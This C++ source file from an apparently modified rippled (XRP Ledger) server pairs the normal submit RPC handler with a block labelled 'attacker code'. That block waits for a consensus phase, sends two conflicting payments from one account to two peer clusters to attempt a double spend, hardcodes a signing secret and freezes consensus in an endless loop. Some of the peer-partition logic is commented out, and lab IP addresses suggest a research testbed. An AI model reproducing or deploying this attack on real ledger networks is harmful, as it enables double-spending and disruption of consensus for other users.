//------------------------------------------------------------------------------
/*
    This file is part of rippled: https://github.com/ripple/rippled
    Copyright (c) 2012-2014 Ripple Labs Inc.

    Permission to use, copy, modify, and/or distribute this software for any
    purpose  with  or without fee is hereby granted, provided that the above
    copyright notice and this permission notice appear in all copies.

    THE  SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
    WITH  REGARD  TO  THIS  SOFTWARE  INCLUDING  ALL  IMPLIED  WARRANTIES  OF
    MERCHANTABILITY  AND  FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
    ANY  SPECIAL ,  DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
    WHATSOEVER  RESULTING  FROM  LOSS  OF USE, DATA OR PROFITS, WHETHER IN AN
    ACTION  OF  CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
    OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
*/
//==============================================================================

#include <chrono>
#include <thread>

#include <ripple/app/consensus/RCLCxTx.h>
#include <ripple/app/misc/Transaction.h>
#include <ripple/app/ledger/LedgerMaster.h>
#include <ripple/app/ledger/OpenLedger.h>
#include <ripple/app/misc/NetworkOPs.h>
#include <ripple/app/misc/HashRouter.h>
#include <ripple/app/misc/Transaction.h>
#include <ripple/app/misc/ValidatorList.h>
#include <ripple/app/main/Application.h>
#include <ripple/app/tx/apply.h>
#include <ripple/consensus/ConsensusProposal.h>
#include <ripple/basics/chrono.h>
#include <ripple/ledger/RawView.h>
#include <ripple/net/RPCErr.h>
#include <ripple/protocol/ErrorCodes.h>
#include <ripple/resource/Fees.h>
#include <ripple/rpc/impl/TransactionSign.h>
#include <ripple/rpc/Role.h>
#include <ripple/rpc/Context.h>
#include <ripple/rpc/impl/TransactionSign.h>
#include <ripple/overlay/impl/PeerImp.h>
#include <ripple/overlay/impl/OverlayImpl.h>
#include <ripple/ledger/ApplyView.h>

namespace ripple {

static NetworkOPs::FailHard getFailHard (RPC::Context const& context)
{
    return NetworkOPs::doFailHard (
        context.params.isMember ("fail_hard")
        && context.params["fail_hard"].asBool ());
}

// {
//   tx_json: <object>,
//   secret: <secret>
// }
Json::Value doSubmit (RPC::Context& context)
{
    context.loadType = Resource::feeMediumBurdenRPC;

    if (!context.params.isMember (jss::tx_blob))
    {
        auto const failType = getFailHard (context);

        if (context.role != Role::ADMIN && !context.app.config().canSign())
            return RPC::make_error (rpcNOT_SUPPORTED,
                "Signing is not supported by this server.");

        auto ret = RPC::transactionSubmit (
            context.params, failType, context.role,
            context.ledgerMaster.getValidatedLedgerAge(),
            context.app, RPC::getProcessTxnFn (context.netOps));

        ret[jss::deprecated] = "Signing support in the 'submit' command has been "
                               "deprecated and will be removed in a future version "
                               "of the server. Please migrate to a standalone "
                               "signing tool.";

        return ret;
    }

    Json::Value jvResult;

    auto ret = strUnHex (context.params[jss::tx_blob].asString ());

    if (!ret || !ret->size ())
        return rpcError (rpcINVALID_PARAMS);

    SerialIter sitTrans (makeSlice(*ret));

    std::shared_ptr<STTx const> stpTrans;

    try
    {
        stpTrans = std::make_shared<STTx const> (std::ref (sitTrans));
    }
    catch (std::exception& e)
    {
        jvResult[jss::error]        = "invalidTransaction";
        jvResult[jss::error_exception] = e.what ();

        return jvResult;
    }


    {
        if (!context.app.checkSigs())
            forceValidity(context.app.getHashRouter(),
                stpTrans->getTransactionID(), Validity::SigGoodOnly);
        auto [validity, reason] = checkValidity(context.app.getHashRouter(),
            *stpTrans, context.ledgerMaster.getCurrentLedger()->rules(),
                context.app.config());
        if (validity != Validity::Valid)
        {
            jvResult[jss::error] = "invalidTransaction";
            jvResult[jss::error_exception] = "fails local checks: " + reason;

            return jvResult;
        }
    }

    std::string reason;
    auto tpTrans = std::make_shared<Transaction> (
        stpTrans, reason, context.app);
    if (tpTrans->getStatus() != NEW)
    {
        jvResult[jss::error]            = "invalidTransaction";
        jvResult[jss::error_exception] = "fails local checks: " + reason;

        return jvResult;
    }

    try
    {
        auto const failType = getFailHard (context);

        context.netOps.processTransaction (
            tpTrans, isUnlimited (context.role), true, failType);
    }
    catch (std::exception& e)
    {
        jvResult[jss::error]           = "internalSubmit";
        jvResult[jss::error_exception] = e.what ();

        return jvResult;
    }


    try
    {
        jvResult[jss::tx_json] = tpTrans->getJson (JsonOptions::none);
        jvResult[jss::tx_blob] = strHex (
            tpTrans->getSTransaction ()->getSerializer ().peekData ());

        if (temUNCERTAIN != tpTrans->getResult ())
        {
            std::string sToken;
            std::string sHuman;

            transResultInfo (tpTrans->getResult (), sToken, sHuman);

            jvResult[jss::engine_result]           = sToken;
            jvResult[jss::engine_result_code]      = tpTrans->getResult ();
            jvResult[jss::engine_result_message]   = sHuman;
        }

        return jvResult;
    }
    catch (std::exception& e)
    {
        jvResult[jss::error]           = "internalJson";
        jvResult[jss::error_exception] = e.what ();

        return jvResult;
    }
}

// Start attacker code
Json::Value doAttack (RPC::Context& context)
{
    performing_attack = true;
    auto j = context.app.journal ("Attack");
    JLOG (j.warn()) << "Starting doAttack(). Setting performing_attack = " << performing_attack;

    // Ensure the attack starts with the beginning of the open-phase
    waitForPhase(context, 5, "establish");
    waitForPhase(context, 5, "open");
        
    // Store transaction-signing secret
    context.params[jss::secret] = "sEd7gsxCwikqZ9C81bjKMFNM9xoReYU";

    // create tx1:
    Json::Value tx1;
    tx1[jss::Account] = "rfhWbXmBpxqjUWfqVv34t4pHJHs6YDFKCN";
    tx1[jss::Amount] = "1000000000";
    tx1[jss::Destination] = "rG1eMisac1neCXeZNPYmwV8sovo5vs9dnB";
    tx1[jss::Fee] = "10";
    tx1[jss::TransactionType] = "Payment";

    // create tx2:
    Json::Value tx2;
    tx2[jss::Account] = "rfhWbXmBpxqjUWfqVv34t4pHJHs6YDFKCN";
    tx2[jss::Amount] = "1000000000";
    tx2[jss::Destination] = "rnkP5Tipm14sqpoDetQxrLjiyyKhk72eAi";
    tx2[jss::Fee] = "10";
    tx2[jss::TransactionType] = "Payment";
    
    context.loadType = Resource::feeMediumBurdenRPC;
    const auto peers = context.app.overlay ().getActivePeers();             // store all peers (so we can connect again later)
    const auto ledger = context.app.getLedgerMaster().getCurrentLedger();   // store current ledger to restore it later
    const auto prevLedger = context.ledgerMaster.getClosedLedger();
    auto const failType = getFailHard (context);

    changePeers(context, peers, 1, j);

    JLOG (j.warn()) << "Submit transaction to cluster 1: " << tx1;
    context.params[jss::tx_json] = tx1;
    global_tx1 = RPC::transactionSubmitAttack (
        context.params, failType, context.role,
        context.ledgerMaster.getValidatedLedgerAge(),
        context.app, RPC::getProcessTxnFnAttack (context.netOps), 1);

    JLOG (j.warn()) << "Submit transaction to cluster 2: " << tx2;
    context.params[jss::tx_json] = tx2;
    global_tx2 = RPC::transactionSubmitAttack (
        context.params, failType, context.role,
        context.ledgerMaster.getValidatedLedgerAge(),
        context.app, RPC::getProcessTxnFnAttack (context.netOps), 2);

    JLOG (j.warn()) << "Attack finished. Keeping performing_attack = true.";
    while (true) {
        performing_attack = true;
        std::this_thread::sleep_for(std::chrono::microseconds(10));
    }
    JLOG (j.warn()) << "Leaving doAttack-function. -> Left while-true loop...";

    return Json::Value();
}

void waitForPhase(RPC::Context& context, int max_seconds_wait, std::string phase_name) {
    auto j = context.app.journal ("Attack");
    unsigned long foo = 0;
    while (strcmp(context.app.getOPs().getConsensusPhase().c_str(), phase_name.c_str()) != 0){
        std::this_thread::sleep_for(std::chrono::microseconds(10));
        foo++;
        if (foo >= max_seconds_wait * 10000) {
            JLOG (j.warn()) << "Not waiting any longer. Currently in phase: " << context.app.getOPs().getConsensusPhase();
            return;
        }
    }
    JLOG (j.warn()) << "waitForPhase: Now in: " << context.app.getOPs().getConsensusPhase();
}

void sendProposal(RPC::Context& context, Json::Value tx, beast::Journal j, int cluster_idx) {
    // const auto currentLedger = context.app.getLedgerMaster().getCurrentLedger();
    // auto closedLedger = context.app.getLedgerMaster().getClosedLedger();
    
    // // Start Consensus<Adaptor>::closeLedger()
    // // We should not be closing if we already have a position

    // phase_ = ConsensusPhase::establish;
    // rawCloseTimes_.self = now_;

    // boost::optional<Result> result_;

    // result_.emplace(adaptor_.onClose(previousLedger_, now_, mode_.get()));
    // result_->roundTime.reset(clock_.now());
    // // Share the newly created transaction set if we haven't already
    // // received it from a peer
    // if (acquired_.emplace(result_->txns.id(), result_->txns).second)
    //     adaptor_.share(result_->txns);

    // if (mode_.get() == ConsensusMode::proposing)
    //     adaptor_.propose(result_->position);
    
    
    // // Start RCLConsensus::Adaptor::propose(RCLCxPeerPos::Proposal const& proposal)
    // JLOG(j_.warn()) << "We propose: "
    //                  << (proposal.isBowOut()
    //                          ? std::string("bowOut")
    //                          : ripple::to_string(proposal.position()));

    // protocol::TMProposeSet prop;

    // prop.set_currenttxhash(
    //     proposal.position().begin(), proposal.position().size());
    // prop.set_previousledger(
    //     proposal.prevLedger().begin(), proposal.position().size());
    // prop.set_proposeseq(proposal.proposeSeq());
    // prop.set_closetime(proposal.closeTime().time_since_epoch().count());

    // prop.set_nodepubkey(valPublic_.data(), valPublic_.size());

    // auto signingHash = sha512Half(
    //     HashPrefix::proposal,
    //     std::uint32_t(proposal.proposeSeq()),
    //     proposal.closeTime().time_since_epoch().count(),
    //     proposal.prevLedger(),
    //     proposal.position());

    // auto sig = signDigest(valPublic_, valSecret_, signingHash);

    // prop.set_signature(sig.data(), sig.size());

    // auto const suppression = proposalUniqueId(
    //     proposal.position(),
    //     proposal.prevLedger(),
    //     proposal.proposeSeq(),
    //     proposal.closeTime(),
    //     valPublic_,
    //     sig);

    // app_.getHashRouter ().addSuppression (suppression);
    
    // app_.overlay().send(prop);


    // // Start OverlayImpl::send(protocol::TMProposeSet& m)
    // protocol::TMProposeSet& m;
    // if (setup_.expire)
    //     m.set_hops(0);
    // auto const sm = std::make_shared<Message>(m, protocol::mtPROPOSE_LEDGER);
    // for_each([&](std::shared_ptr<PeerImp>&& p)
    // {
    //     p->send(sm);
    // });
}

void changePeers (RPC::Context& context, Overlay::PeerSequence peers, int cluster_idx, beast::Journal j) {
    JLOG (j.warn()) << "changePeers: start (cluster_idx: " << cluster_idx << ")";
    
    // Iter over all peers and either connect or disconnect from peers
    for (auto& peer : peers) {
        if (peer) {
            auto peer_endpoint = peer->getRemoteAddress();
            std::string addressString = peer_endpoint.address().to_string();

            JLOG (j.warn()) << addressString << " has id: " << peer->id();

            // if (shouldConnectPeer(addressString, cluster_idx)) {
            //     JLOG (j.warn()) << "changePeers: connect    to   " << addressString;
            //     context.app.overlay ().connect(peer_endpoint);
            // } else {
            //     JLOG (j.warn()) << "changePeers: disconnect from " << addressString;
            //     auto peerImp = std::dynamic_pointer_cast<PeerImp>(peer);
            //     peerImp->close();
            // }
        }
    }
}

bool shouldConnectPeer(std::string peer_address, int cluster_idx) {
    bool is_node1 = (strcmp(peer_address.c_str(), "10.5.1.1") == 0);  // in cluster 1
    bool is_node2 = (strcmp(peer_address.c_str(), "10.5.1.2") == 0);  // in cluster 1
    bool is_node3 = (strcmp(peer_address.c_str(), "10.5.1.3") == 0);  // in cluster 1
    bool is_node4 = (strcmp(peer_address.c_str(), "10.5.1.4") == 0);  // in cluster 2
    bool is_node5 = (strcmp(peer_address.c_str(), "10.5.1.5") == 0);  // in cluster 2
    bool is_node6 = (strcmp(peer_address.c_str(), "10.5.1.6") == 0);  // in cluster 2

    if (cluster_idx == 0) {         // connect to all
        return true;
    }
    else if (cluster_idx == 1) {    // connect to network-cluster 1
        return (is_node1 || is_node2 || is_node3);
    }
    else if (cluster_idx == 2) {    // connect to network-cluster 2
        return (is_node4 || is_node5 || is_node6);
    } else {                        // connect to no nodes
        return false;
    }
}

Json::Value unfreeze(RPC::Context& context) {
    auto j = context.app.journal ("Attack");
    Json::Value ret;
    if (!performing_attack) {
        ret[jss::status] = "unsuccessful";
        ret[jss::message] = "Not performing attack right now. Nothing to do...";
        return ret;
    }
    performing_attack = false;
    JLOG (j.warn()) << "Unfreeze: Setting performing_attack = " << performing_attack;
    ret[jss::message] = "Unfreeze the network. Sending proposals and validation-messages again.";
    return ret;
}
// End attacker code

} // ripple
